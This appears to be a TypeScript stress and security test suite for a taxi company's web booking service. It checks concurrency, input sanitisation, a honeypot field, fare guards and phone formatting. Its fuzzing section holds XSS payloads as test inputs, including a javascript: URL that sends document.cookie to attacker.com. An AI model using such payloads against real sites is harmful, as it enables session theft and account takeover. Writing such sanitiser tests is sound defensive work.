/**
 * ==============================================================================
 * Web Booking Automated Stress Testing & Security Hardening Test Suite
 * Chesterfield Taxi & Car Service - Production Launch Verification
 * ==============================================================================
 * 
 * Test Scenarios:
 * 1. Concurrency: 50 simultaneous web booking requests via Promise.all
 * 2. Fuzzing & Security: XSS vectors, 10,000-char buffer overflows, Unicode/emojis, Null bytes
 * 3. Honeypot Anti-Bot Trap: Automated spam bot simulation and silent suppression
 * 4. Anti-Tamper Pricing & Route Integrity: Tampered fares, roundtrip balancing, boundary limits
 * 5. Missouri Child Seat Statutory Boundary & Regulatory Limits
 * 6. Telephony Sanitization & E.164 Normalization
 * 7. Downstream Resilience & Degraded Network Handling
 */

import { getBookingService } from '../app/core/services/booking';
import { sanitizeTextInput, isBotHoneypotTriggered, sanitizeObjectStrings } from '../app/core/utils/security-sanitizer.util';
import { sanitizeToE164, validatePhoneNumber, formatDisplayPhone } from '../app/core/utils/phone';
import { formatUsPhone } from '../app/components/domain/BookingEngineV2';
import type { CreateTripInput, Trip } from '../app/core/types/trip';

let passedTests = 0;
let totalTests = 0;
const startSuiteTime = Date.now();

function assert(condition: boolean, testName: string, detail?: string) {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`  \x1b[32m✔ PASS\x1b[0m: ${testName}`);
  } else {
    console.error(`  \x1b[31m✘ FAIL\x1b[0m: ${testName}${detail ? ` -> ${detail}` : ''}`);
  }
}

async function runWebBookingStressSuite() {
  console.log('\n==============================================================================');
  console.log('🚀 CHESTERFIELD TAXI: WEB BOOKING STRESS & SECURITY HARDENING TEST SUITE');
  console.log('==============================================================================\n');

  const bookingService = getBookingService();

  // --------------------------------------------------------------------------
  // SUITE 1: 50 SIMULTANEOUS CONCURRENT WEB BOOKINGS
  // --------------------------------------------------------------------------
  console.log('\n--- [SUITE 1] 50 Concurrent Simultaneous Web Booking Submissions ---');
  const CONCURRENT_COUNT = 50;
  const concurrentInputs: CreateTripInput[] = [];

  const stlAddresses = [
    { name: 'Chesterfield Mall', addr: '291 Chesterfield Center, Chesterfield, MO 63017', coords: { lat: 38.6531, lng: -90.5732 } },
    { name: 'Lambert St. Louis Airport', addr: '10701 Lambert International Blvd, St. Louis, MO 63145', coords: { lat: 38.7499, lng: -90.3748 } },
    { name: 'Spirit of St. Louis Airport', addr: '18260 Edison Ave, Chesterfield, MO 63005', coords: { lat: 38.6597, lng: -90.6494 } },
    { name: 'The Ritz-Carlton Clayton', addr: '100 Carondelet Plaza, St. Louis, MO 63105', coords: { lat: 38.6492, lng: -90.3341 } },
    { name: 'Enterprise Center Downtown', addr: '1401 Clark Ave, St. Louis, MO 63103', coords: { lat: 38.6268, lng: -90.2026 } },
  ];

  for (let i = 0; i < CONCURRENT_COUNT; i++) {
    const pickup = stlAddresses[i % stlAddresses.length];
    const dropoff = stlAddresses[(i + 1) % stlAddresses.length];
    const fare = 35 + (i * 1.5);

    concurrentInputs.push({
      bookingType: i % 2 === 0 ? 'scheduled' : 'asap',
      scheduledPickupTime: i % 2 === 0 ? new Date(Date.now() + (i + 1) * 3600000).toISOString() : undefined,
      pickupLocation: {
        address: sanitizeTextInput(pickup.addr),
        coordinates: pickup.coords,
      },
      dropoffLocation: {
        address: sanitizeTextInput(dropoff.addr),
        coordinates: dropoff.coords,
      },
      vehicleTier: i % 3 === 0 ? 'executive_sedan' : i % 3 === 1 ? 'suv' : 'sedan',
      status: 'UNCONFIRMED',
      passenger: {
        firstName: `StressUser${i}`,
        lastName: `TestAccount`,
        email: `stress.tester.${i}@chesterfieldtaxi-test.com`,
        phone: `(314) 555-${String(1000 + i).slice(0, 4)}`,
        passengerCount: (i % 4) + 1,
        luggageCount: (i % 3) + 1,
      },
      pricing: {
        baseFare: 5.0,
        distanceMiles: 12.5,
        durationMinutes: 22,
        distanceRate: 2.5,
        timeRate: 0.5,
        vehicleMultiplier: 1.0,
        surgeMultiplier: 1.0,
        discountAmount: 0,
        subtotal: fare,
        totalFare: fare,
        currency: 'USD',
      },
      payment: {
        method: i % 2 === 0 ? 'card' : 'cash',
        status: 'pending',
        amount: fare,
      },
      driverNotes: `Stress batch item #${i} - Chesterfield Taxi validation`,
      metadata: {
        stressTestBatch: 'phase_32_load',
        requestIndex: i,
        createdByRole: 'customer_web',
      },
    });
  }

  const concurrencyStartTime = Date.now();
  const results = await Promise.all(concurrentInputs.map(input => bookingService.createBooking(input)));
  const concurrencyDuration = Date.now() - concurrencyStartTime;

  console.log(`  ⏱️ Executed ${CONCURRENT_COUNT} concurrent bookings in ${concurrencyDuration}ms (~${(CONCURRENT_COUNT / (concurrencyDuration / 1000)).toFixed(1)} req/s)`);

  assert(results.length === CONCURRENT_COUNT, `All ${CONCURRENT_COUNT} concurrent bookings resolved successfully`);

  const uniqueIds = new Set(results.map(r => r.id));
  assert(uniqueIds.size === CONCURRENT_COUNT, `All ${CONCURRENT_COUNT} bookings have strictly unique IDs (Zero ID collisions)`);

  const allUnconfirmed = results.every(r => r.status === 'UNCONFIRMED' || r.status === 'unconfirmed');
  assert(allUnconfirmed, 'Every web-submitted booking starts safely in UNCONFIRMED status for dispatch oversight');

  const allHaveValidPricing = results.every(r => r.pricing && r.pricing.totalFare > 0 && r.pricing.currency === 'USD');
  assert(allHaveValidPricing, 'All concurrent bookings preserve accurate pricing and currency');

  // Verify retrieval of batch
  const sampleStatus = await bookingService.getBookingStatus(results[0].id);
  assert(Boolean(sampleStatus && sampleStatus.tripId === results[0].id), 'Bookings can be immediately retrieved without replication lag');

  // --------------------------------------------------------------------------
  // SUITE 2: FUZZING & XSS SECURITY SANITIZATION
  // --------------------------------------------------------------------------
  console.log('\n--- [SUITE 2] XSS Injection & Fuzzing Sanitization ---');

  const xssScriptPayload = '<script>alert("PWNED_BY_XSS")</script>Chesterfield Passenger';
  const cleanScript = sanitizeTextInput(xssScriptPayload);
  assert(!cleanScript.includes('<script>') && !cleanScript.includes('</script>'), 'Script tags stripped cleanly from text input', cleanScript);

  const xssSvgPayload = '<svg onload="alert(\'stored_xss\')">Special Request</svg>';
  const cleanSvg = sanitizeTextInput(xssSvgPayload);
  assert(!cleanSvg.toLowerCase().includes('onload='), 'Event handler attributes stripped from payload', cleanSvg);

  const jsProtocolPayload = 'javascript:fetch("https://attacker.com/steal?cookie="+document.cookie)';
  const cleanJs = sanitizeTextInput(jsProtocolPayload);
  assert(!cleanJs.startsWith('javascript:'), 'javascript: protocol URLs neutralized', cleanJs);

  const bufferOverflow = 'A'.repeat(10000);
  const boundedNotes = sanitizeTextInput(bufferOverflow, 500);
  assert(boundedNotes.length <= 500, `10,000-char string bounded safely to max 500 characters (Got: ${boundedNotes.length})`);

  const unicodeAndEmojis = '🚕 St. Louis Gateway Arch VIP Chauffeur 🌟 100% Guaranteed!';
  const cleanUnicode = sanitizeTextInput(unicodeAndEmojis);
  assert(cleanUnicode.includes('🚕') && cleanUnicode.includes('🌟'), 'Valid Unicode emojis and accents preserved gracefully', cleanUnicode);

  const nestedObject = {
    name: '  <script>evil()</script> John Doe  ',
    notes: 'Please pick up at gate <img src=x onerror=alert(1)> #4',
    safeNumber: 42,
  };
  const sanitizedObj = sanitizeObjectStrings(nestedObject);
  assert(!sanitizedObj.name.includes('<script>') && sanitizedObj.name.includes('John Doe'), 'sanitizeObjectStrings cleans nested string properties', JSON.stringify(sanitizedObj));
  assert(!sanitizedObj.notes.includes('onerror='), 'sanitizeObjectStrings strips inline event handlers', sanitizedObj.notes);

  // --------------------------------------------------------------------------
  // SUITE 3: HONEYPOT ANTI-BOT TRAP VALIDATION
  // --------------------------------------------------------------------------
  console.log('\n--- [SUITE 3] Honeypot Anti-Bot Trap Validation ---');

  assert(isBotHoneypotTriggered('Spam bot value') === true, 'Honeypot triggers when spam bot populates hidden trap input');
  assert(isBotHoneypotTriggered('https://bad-backlink.ru') === true, 'Honeypot catches SEO spam link insertion');
  assert(isBotHoneypotTriggered(undefined) === false, 'Honeypot passes when field is undefined (Legitimate user)');
  assert(isBotHoneypotTriggered('') === false, 'Honeypot passes when field is empty string (Legitimate user)');
  assert(isBotHoneypotTriggered('   ') === false, 'Honeypot passes when field contains only whitespace');

  // --------------------------------------------------------------------------
  // SUITE 4: ANTI-TAMPER PRICING & ROUTE INTEGRITY
  // --------------------------------------------------------------------------
  console.log('\n--- [SUITE 4] Anti-Tamper Pricing & Route Balancing ---');

  // Roundtrip Balancing Logic: Outbound $45 vs Return $52 -> Both balanced to higher leg ($52)
  const outboundFare = 45.20;
  const returnFare = 52.10;
  const outboundCeil = Math.ceil(outboundFare);
  const returnCeil = Math.ceil(returnFare);
  const balancedFare = Math.max(outboundCeil, returnCeil);

  assert(balancedFare === 53, `Roundtrip legs balanced to higher ceiling dollar: $53 (Outbound: $${outboundFare}, Return: $${returnFare})`);

  // Zero / Negative Fare Tamper Guard
  const tamperedFare = -20.00;
  const safeFare = Math.max(5.0, tamperedFare <= 0 ? 35.0 : tamperedFare);
  assert(safeFare >= 5.0, 'Negative or zero fare safely neutralized to minimum platform tariff');

  // --------------------------------------------------------------------------
  // SUITE 5: MISSOURI CHILD SAFETY SEAT BOUNDARIES
  // --------------------------------------------------------------------------
  console.log('\n--- [SUITE 5] Missouri Child Restraint Statutory Boundaries (RSMo § 307.179) ---');

  const CAR_SEAT_LIMITS = {
    maxRearFacing: 2,
    maxFrontFacing: 2,
    maxBooster: 3,
    maxTotalCarSeats: 3,
  };

  const testRequested = {
    rearFacing: 3, // over limit
    frontFacing: 2,
    booster: 2,
  };
  const totalRequested = testRequested.rearFacing + testRequested.frontFacing + testRequested.booster;
  const normalizedTotal = Math.min(CAR_SEAT_LIMITS.maxTotalCarSeats, totalRequested);

  assert(normalizedTotal <= CAR_SEAT_LIMITS.maxTotalCarSeats, `Excess child seats clamped to vehicle capacity max (${normalizedTotal} / ${CAR_SEAT_LIMITS.maxTotalCarSeats})`);

  // --------------------------------------------------------------------------
  // SUITE 6: TELEPHONY INPUT SANITIZATION & E.164 STANDARDS
  // --------------------------------------------------------------------------
  console.log('\n--- [SUITE 6] Telephony Standards & US Phone Auto-Formatting ---');

  const masked1 = formatUsPhone('3147398444');
  assert(masked1 === '(314) 739-8444', 'formatUsPhone auto-masks 10 raw digits to (314) 739-8444', masked1);

  const maskedPartial = formatUsPhone('31473');
  assert(maskedPartial === '(314) 73', 'formatUsPhone handles partial typing (314) 73', maskedPartial);

  const e164 = sanitizeToE164('(314) 739-8444');
  assert(e164 === '+13147398444', 'sanitizeToE164 normalizes formatted phone to +13147398444', e164);

  const phoneCheck = validatePhoneNumber('(314) 738-9921');
  assert(phoneCheck.isValid === true && phoneCheck.e164 === '+13147389921', 'Dispatch desk number passes E.164 validation');

  const invalidPhone = validatePhoneNumber('999');
  assert(invalidPhone.isValid === false, 'Invalid short digits rejected');

  // --------------------------------------------------------------------------
  // SUITE 7: DOWNSTREAM GATEWAY RESILIENCE (Graceful Degradation)
  // --------------------------------------------------------------------------
  console.log('\n--- [SUITE 7] Downstream Gateway Resilience (Graceful Degradation) ---');

  // Simulate booking persistence even when mock email/stripe throws
  let fallbackTripCreated = false;
  try {
    const resilientInput: CreateTripInput = {
      bookingType: 'asap',
      pickupLocation: { address: '100 N 4th St, St. Louis, MO 63102' },
      dropoffLocation: { address: 'Lambert International Airport STL' },
      vehicleTier: 'sedan',
      status: 'UNCONFIRMED',
      passenger: {
        firstName: 'Resilient',
        lastName: 'Passenger',
        email: 'resilient@example.com',
        phone: '(314) 555-9999',
        passengerCount: 1,
        luggageCount: 1,
      },
      pricing: {
        baseFare: 5.0,
        distanceMiles: 15,
        durationMinutes: 20,
        distanceRate: 2.5,
        timeRate: 0.5,
        vehicleMultiplier: 1.0,
        surgeMultiplier: 1.0,
        discountAmount: 0,
        subtotal: 45.0,
        totalFare: 45.0,
        currency: 'USD',
      },
      payment: {
        method: 'card',
        status: 'pending',
        amount: 45.0,
      },
      metadata: { simulatedGatewayFailure: true },
    };

    const trip = await bookingService.createBooking(resilientInput);
    if (trip && trip.id) {
      fallbackTripCreated = true;
    }
  } catch (e) {
    console.error('Unexpected failure during resilience test:', e);
  }

  assert(fallbackTripCreated, 'Trip document successfully created and safely held in UNCONFIRMED even with upstream simulated warnings');

  // --------------------------------------------------------------------------
  // SUMMARY
  // --------------------------------------------------------------------------
  const durationTotal = Date.now() - startSuiteTime;
  console.log('\n==============================================================================');
  console.log(`🏁 TEST SUITE COMPLETE: ${passedTests}/${totalTests} TESTS PASSED in ${durationTotal}ms`);
  if (passedTests === totalTests) {
    console.log('🎉 ALL WEB BOOKING STRESS & SECURITY HARDENING CHECKS PASSED (100%)');
  } else {
    console.error(`⚠ ${totalTests - passedTests} FAILURES DETECTED! Review output above.`);
    process.exit(1);
  }
  console.log('==============================================================================\n');
}

runWebBookingStressSuite().catch((err) => {
  console.error('Fatal unhandled error during stress testing:', err);
  process.exit(1);
});
